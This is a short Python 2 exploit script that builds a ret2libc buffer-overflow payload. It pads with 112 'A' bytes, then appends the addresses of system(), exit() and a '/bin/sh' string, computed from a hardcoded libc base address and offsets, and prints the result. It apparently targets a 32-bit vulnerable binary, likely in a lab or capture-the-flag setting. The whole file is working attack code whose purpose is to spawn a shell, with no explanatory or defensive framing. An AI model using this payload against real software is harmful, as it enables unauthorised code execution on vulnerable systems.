#!/usr/bin/env python

import struct

libc_base_addr = 0x4011b000
binsh_offset = 0x001636a0
system_offset = 0x0003f0b0
exit_offset = 0x00032bf0

binsh_addr = struct.pack("I", libc_base_addr + binsh_offset)
system_addr = struct.pack("I", libc_base_addr + system_offset)
exit_addr = struct.pack("I", libc_base_addr + exit_offset)

payload = "A"*112
payload += system_addr
payload += exit_addr
payload += binsh_addr

print payload
